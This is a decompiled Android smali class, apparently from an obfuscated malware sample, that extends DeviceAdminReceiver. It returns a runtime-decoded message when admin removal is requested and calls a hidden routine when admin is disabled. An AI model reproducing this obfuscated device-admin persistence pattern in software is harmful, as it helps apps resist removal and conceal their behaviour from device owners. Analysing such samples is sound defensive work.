.class public Lru/jdhndtpk/iypwqbmltdwdk/czujjjp/DTaOgA;
.super Landroid/app/admin/DeviceAdminReceiver;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 1

    const-string v0, "FdyylmCxgecNDc"

    invoke-static {v0}, Lru/jdhndtpk/iypwqbmltdwdk/a;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public onDisabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 1

    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onDisabled(Landroid/content/Context;Landroid/content/Intent;)V

    const/4 v0, 0x1

    invoke-static {p1, v0}, Lru/jdhndtpk/iypwqbmltdwdk/c/d;->a(Landroid/content/Context;Z)V

    return-void
.end method
